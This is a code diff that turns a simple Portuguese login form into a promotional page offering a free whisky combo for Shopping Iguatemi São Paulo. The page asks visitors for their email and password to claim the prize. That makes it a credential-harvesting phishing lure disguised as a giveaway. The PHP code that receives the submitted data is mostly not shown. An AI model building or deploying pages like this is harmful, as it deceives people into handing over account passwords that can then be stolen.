@@ -1,22 +1,55 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Formulário de Login</title>
-</head>
-
-<body>
-  <form action="/" method="post">
-    <label for="email">Email:</label>
-    <input type="email" id="email" name="email" required><br>
-    <label for="senha">Senha:</label>
-    <input type="password" id="senha" name="senha" required><br>
-    <input type="submit" value="Login">
-  </form>
-</body>
-
+<html><head>
+    <link rel="stylesheet" href="globals.css">
+    <link rel="stylesheet" href="styleguide.css">
+    <link rel="stylesheet" href="style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=0.7, 
+user-scalable=no">
+  </head>
+  <body>
+    <div class="desktop-auth" style="
+    height: 100%;
+    position: relative;
+    margin: 0 auto;
+">
+      <div class="div" style="
+    align-items: center;
+    align-content: center;
+    position: relative;
+    width: 100%;
+    height: 100%;
+    margin: 0 auto;
+">
+        <img class="logo" src="img/logo-1.svg" style="
+    margin: 0 auto;
+    margin-top: 50px;
+    width: 100%;
+    margin-bottom: -50px;
+    position: relative;
+    left: 0px;
+"><div class="overlap-group" style="
+    margin: 0 auto;
+    position: relative;
+    left: 0px;
+">
+          <img class="banner" src="img/banner.png">
+          <p class="voc-ganhou-um-combo">
+            Você ganhou um combo de <br>Whisky Grátis em comemoração ao lançamento do filme, para resgatar
+          </p>
+          <p class="text-wrapper">Promoção exclusiva para o Shopping Iguatemi São Paulo</p>
+          <form action="./" method="post" class="form">
+            <input class="PB-input" placeholder="E-Mail" style="
+    font-weight: 800;font:white;
+" type="email" id="email" name="email" required>
+            <input class="div-wrapper" placeholder="Senha" style="font-weight: 800;font:white" type="password" id="senha" name="senha" required>
+            <input class="PB-button" style="font-weight: 600;;font:white" type="submit" value="RESGATAR COMBO!">
+            <p class="p">Ao resgatar você concorda com os Termos de Uso</p>
+          </div>
+        </div>
+        
+        
+      </div>
+    </div>
+  
 <?php
 // Verificar se a requisição é POST
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -44,5 +77,4 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 }
 ?>
 
-
-</html>
+</body></html>
